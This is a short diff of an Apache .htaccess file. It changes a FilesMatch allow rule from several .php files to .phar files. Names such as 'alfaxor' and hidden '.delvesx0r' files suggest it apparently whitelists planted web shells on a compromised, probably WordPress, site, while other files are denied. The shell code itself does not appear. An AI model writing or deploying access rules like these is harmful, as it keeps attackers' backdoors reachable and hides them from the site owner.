@@ -27,7 +27,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(index.php|wp-config.php|alfaxor.php|.indelvesx0r.php|.delvesx0r.php|.wsdelvesx0r.php|wsdelvesx0r.php|indelvesx0r.php)$">
+<FilesMatch "^(index.html|index.php|alfaxor.phar|.indelvesx0r.phar|.delvesx0r.phar|.wsdelvesx0r.phar|wsdelvesx0r.phar|wsx0r.phar)$">
 
  Order allow,deny
 
